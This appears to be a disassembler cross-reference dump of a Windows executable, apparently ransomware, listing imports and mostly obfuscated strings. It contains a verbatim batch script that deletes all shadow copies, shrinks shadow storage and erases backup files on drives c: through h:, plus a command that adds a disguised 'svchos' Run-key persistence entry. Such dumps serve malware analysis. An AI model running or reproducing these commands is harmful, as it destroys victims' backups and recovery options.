reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x140006755	0x140008180	string	0x1400053a0	H;\ry
0x140006941	0x1400283c4	string	0x1400068d0	lTGg_
0x14000699e	0x1400270d0	string	0x1400068d0	.5(\r
0x140006b4b	0x140028998	string	0x1400068d0	>/:\f#
0x140006b8b	0x140029418	string	0x1400068d0	>\t=\b#
0x140006d8d	0x140023a10	string	0x1400068d0	/3*\e>
0x140007082	0x140018078	import	0x1400068d0	KERNEL32.dll.LoadLibraryA
0x140007092	0x1400270d0	string	0x1400068d0	.5(\r
0x140007099	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400070c3	0x140027cec	string	0x1400068d0	\r6,ZcL>%
0x1400070eb	0x1400200e0	string	0x1400068d0	Iphlpapi.dll
0x140007106	0x1400200f0	string	0x1400068d0	GetLastError
0x140007114	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000712f	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000714a	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007157	0x1400275b2	string	0x1400068d0	&?%\f%\a
0x140007165	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007172	0x1400278a0	string	0x1400068d0	%?=-#\v,,=(
0x140007179	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007186	0x140027454	string	0x1400068d0	%?=*>
0x140007194	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400071a1	0x14002783c	string	0x1400068d0	%?=:%
0x1400071a8	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400071b5	0x140027166	string	0x1400068d0	$3'\r
0x1400071bc	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400071d7	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400071e4	0x140027b5c	string	0x1400068d0	%?=<"\a(\a\b<\a\e
0x1400071f2	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007206	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007213	0x1400271ca	string	0x1400068d0	55>_e0??\f#
0x140007221	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000722e	0x1400273f0	string	0x1400068d0	!(,\b%\a\n;
0x140007235	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007261	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000726e	0x140027648	string	0x1400068d0	%?=?4
0x14000727c	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007289	0x14002751c	string	0x1400068d0	55>_e&3:\b3
0x140007290	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000729d	0x140020100	string	0x1400068d0	GetSystemDefaultLangID
0x1400072a4	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400072b1	0x140027b8e	string	0x1400068d0	%?=<"\a(\a\b<\a\r
0x1400072b8	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400072c5	0x1400275e4	string	0x1400068d0	0?(\r
0x1400072cc	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400072d9	0x140027c24	string	0x1400068d0	0?.8$\a(0?0
0x1400072e7	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400072fb	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007308	0x140027cba	string	0x1400068d0	0?.:4
0x140007316	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007323	0x140027c56	string	0x1400068d0	0?.*=\r),"4\e
0x14000732a	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000733e	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000734b	0x14002780a	string	0x1400068d0	1?=/8
0x140007352	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000735f	0x140027710	string	0x1400068d0	53',)\a9
0x14000736d	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007381	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007395	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400073a2	0x140027742	string	0x1400068d0	16,\f!
0x1400073b0	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400073bd	0x1400277a6	string	0x1400068d0	%?=*$
0x1400073cb	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400073df	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400073ec	0x140027616	string	0x1400068d0	%?=/8
0x1400073fa	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007407	0x1400274b8	string	0x1400068d0	%6&\v0
0x140007415	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007422	0x1400276de	string	0x1400068d0	$3'\r
0x140007430	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000743d	0x140020118	string	0x1400068d0	WaitForMultipleObjects
0x14000744b	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007458	0x140027198	string	0x1400068d0	%?=$>
0x14000745f	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007473	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007480	0x1400273be	string	0x1400068d0	%?=$>
0x140007487	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007494	0x1400274ea	string	0x1400068d0	%?=$>
0x14000749b	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400074a8	0x14002722e	string	0x1400068d0	!(,\b%\a
0x1400074af	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400074bc	0x140020130	string	0x1400068d0	GetFileSizeEx
0x1400074c3	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400074de	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400074eb	0x1400277d8	string	0x1400068d0	%?=%>
0x1400074f9	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007514	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007521	0x140027bf2	string	0x1400068d0	0?.&!\a4
0x14000752f	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007543	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007550	0x1400272c4	string	0x1400068d0	%?=>8\f>&
0x14000755e	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000756b	0x14002754e	string	0x1400068d0	1?=/8
0x140007579	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007586	0x140027bc0	string	0x1400068d0	0?.&!\a4
0x14000758d	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000759a	0x1400271fc	string	0x1400068d0	1?=/8
0x1400075a1	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400075ae	0x14002786e	string	0x1400068d0	%?==8
0x1400075bc	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400075c9	0x14002767a	string	0x1400068d0	%?=/8
0x1400075d0	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400075dd	0x140027134	string	0x1400068d0	$3'\r
0x1400075e4	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400075ff	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000760c	0x140020140	string	0x1400068d0	MoveFileExW
0x14000761a	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000762e	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007649	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000765d	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007671	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000767e	0x140020150	string	0x1400068d0	SetFilePointerEx
0x14000768c	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400076a7	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400076b4	0x140027486	string	0x1400068d0	$(,\f
0x1400076bb	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400076c8	0x14002738c	string	0x1400068d0	!(,\b%\a\n;
0x1400076d6	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400076e3	0x1400272f6	string	0x1400068d0	!(,\b%\a
0x1400076ea	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x1400076f7	0x140020168	string	0x1400068d0	CreateThread
0x1400076fe	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007712	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000771f	0x140027d50	string	0x1400068d0	!5\n\e4
0x14000772d	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000773a	0x140027328	string	0x1400068d0	!(,\b%\a
0x140007741	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000774e	0x1400276ac	string	0x1400068d0	%?=/8
0x14000775c	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x140007770	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000777d	0x140027c88	string	0x1400068d0	0?.-4
0x14000778b	0x1400180b8	import	0x1400068d0	KERNEL32.dll.GetProcAddress
0x14000779a	0x140008180	string	0x1400068d0	H;\ry
0x140007830	0x1400180f0	import	0x1400077c0	KERNEL32.dll.GetVersionExW
0x14000784b	0x140008180	string	0x1400077c0	H;\ry
0x140007a83	0x1400283c4	string	0x140007860	lTGg_
0x140007ad6	0x140020180	string	0x140007860	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk\r\ndel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk\r\ndel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk\r\ndel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk\r\ndel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk\r\ndel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk\r\ndel %0
0x140007d6f	0x140008180	string	0x140007860	H;\ry
0x140007db9	0x140020778	string	0x140007da0	kernel32.dll
0x140007dc8	0x140018078	import	0x140007da0	KERNEL32.dll.LoadLibraryA
0x140007dd9	0x140020788	string	0x140007da0	IsWow64Process
0x140007e08	0x1400180b8	import	0x140007da0	KERNEL32.dll.GetProcAddress
0x140007e16	0x140018108	import	0x140007da0	KERNEL32.dll.GetCurrentProcess
0x140007e29	0x1400180d8	import	0x140007da0	KERNEL32.dll.FreeLibrary
0x140007e3b	0x140008180	string	0x140007da0	H;\ry
0x140007e8e	0x1400180b0	import	0x140007e50	KERNEL32.dll.GetWindowsDirectoryW
0x140007efa	0x14001fff0	string	0x140007e50	\System32\cmd.exe
0x140007f2d	0x140018100	import	0x140007e50	KERNEL32.dll.GetModuleFileNameW
0x140007f33	0x1400207a0	string	0x140007e50	/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
0x140008096	0x140020870	string	0x140007e50	" /f
0x140008106	0x140020880	string	0x140007e50	/reg:64
0x140008139	0x1400182f8	import	0x140007e50	SHELL32.dll.ShellExecuteW
0x14000814b	0x140008180	string	0x140007e50	H;\ry
0x1400081af	0x140018170	import	0x1400081a4	KERNEL32.dll.SetUnhandledExceptionFilter
0x1400081b8	0x140018168	import	0x1400081a4	KERNEL32.dll.UnhandledExceptionFilter
0x1400081be	0x140018108	import	0x1400081a4	KERNEL32.dll.GetCurrentProcess
0x1400081d1	0x140018178	import	0x1400081a4	KERNEL32.dll.TerminateProcess
0x1400081fd	0x1400083cc	string	0x1400081a4	@SVWH
0x140008369	0x140018150	import	0x14000835c	KERNEL32.dll.RtlCaptureContext
0x140008381	0x140018158	import	0x14000835c	KERNEL32.dll.RtlLookupFunctionEntry
0x1400083b8	0x140018160	import	0x14000835c	KERNEL32.dll.RtlVirtualUnwind
0x1400083d7	0x140018150	import	0x1400083cc	KERNEL32.dll.RtlCaptureContext
0x1400083f1	0x140018158	import	0x1400083cc	KERNEL32.dll.RtlLookupFunctionEntry
0x140008428	0x140018160	import	0x1400083cc	KERNEL32.dll.RtlVirtualUnwind
0x14000898c	0x1400181a0	import	0x140008960	KERNEL32.dll.GetSystemTimeAsFileTime
0x14000899a	0x140018198	import	0x140008960	KERNEL32.dll.GetCurrentThreadId
0x1400089a6	0x140018190	import	0x140008960	KERNEL32.dll.GetCurrentProcessId
0x1400089b6	0x140018188	import	0x140008960	KERNEL32.dll.QueryPerformanceCounter
0x140008a23	0x1400181a8	import	0x140008a1c	KERNEL32.dll.InitializeSListHead
0x140008ab9	0x140018150	import	0x140008a74	KERNEL32.dll.RtlCaptureContext
0x140008ad3	0x140018158	import	0x140008a74	KERNEL32.dll.RtlLookupFunctionEntry
0x140008b14	0x140018160	import	0x140008a74	KERNEL32.dll.RtlVirtualUnwind
0x140008b68	0x1400181b0	import	0x140008a74	KERNEL32.dll.IsDebuggerPresent
0x140008b89	0x140018170	import	0x140008a74	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008b94	0x140018168	import	0x140008a74	KERNEL32.dll.UnhandledExceptionFilter
0x140008bd8	0x1400181b8	import	0x140008bbc	KERNEL32.dll.GetStartupInfoW
0x140008c02	0x1400181c0	import	0x140008bfc	KERNEL32.dll.GetModuleHandleW
0x140008c57	0x140018170	import	0x140008c50	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008f45	0x140018100	import	0x140008f14	KERNEL32.dll.GetModuleFileNameW
0x140008f5d	0x140018060	import	0x140008f14	KERNEL32.dll.GetLastError
0x140008fa1	0x1400183c8	string	0x140008f14	Main Invoked.
0x140009016	0x140008180	string	0x140008f14	H;\ry
0x14000905d	0x140018100	import	0x14000902c	KERNEL32.dll.GetModuleFileNameW
0x140009075	0x140018060	import	0x14000902c	KERNEL32.dll.GetLastError
0x1400090b9	0x1400183d8	string	0x14000902c	Main Returned.
0x14000912e	0x140008180	string	0x14000902c	H;\ry
0x140009484	0x140018200	import	0x1400093d8	KERNEL32.dll.LoadLibraryExW
0x140009497	0x140018060	import	0x1400093d8	KERNEL32.dll.GetLastError
0x1400094aa	0x140018200	import	0x1400093d8	KERNEL32.dll.LoadLibraryExW
0x1400094e7	0x1400180d8	import	0x1400093d8	KERNEL32.dll.FreeLibrary
0x14000951b	0x1400180b8	import	0x1400093d8	KERNEL32.dll.GetProcAddress
0x1400095c2	0x1400184b8	string	0x1400095a0	EventRegister
0x1400095d3	0x1400184b8	string	0x1400095a0	EventRegister
0x140009656	0x1400184d0	string	0x140009624	EventSetInformation
0x1400096b5	0x1400184e8	string	0x1400096a8	EventUnregister
0x1400096c8	0x1400184e8	string	0x1400096a8	EventUnregister
0x14000972f	0x140018500	string	0x1400096fc	EventWriteTransfer
0x1400097a1	0x140018520	string	0x140009794	FlsAlloc
0x1400097b4	0x140018520	string	0x140009794	FlsAlloc
0x1400097d7	0x1400181e0	import	0x140009794	KERNEL32.dll.TlsAlloc
0x1400097f4	0x140018538	string	0x1400097e8	FlsFree
0x140009807	0x140018538	string	0x1400097e8	FlsFree
0x14000982b	0x1400181f8	import	0x1400097e8	KERNEL32.dll.TlsFree
0x14000984e	0x140018558	string	0x14000983c	FlsSetValue
0x140009857	0x140018558	string	0x14000983c	FlsSetValue
0x14000988d	0x1400181f0	import	0x14000983c	KERNEL32.dll.TlsSetValue
0x1400098bb	0x140018570	string	0x1400098a4	InitializeCriticalSectionEx
0x1400098ce	0x140018570	string	0x1400098a4	InitializeCriticalSectionEx
0x140009900	0x1400181d8	import	0x1400098a4	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x140009972	0x1400180d8	import	0x140009954	KERNEL32.dll.FreeLibrary
0x140009b03	0x140018218	import	0x140009ae4	KERNEL32.dll.DeleteCriticalSection
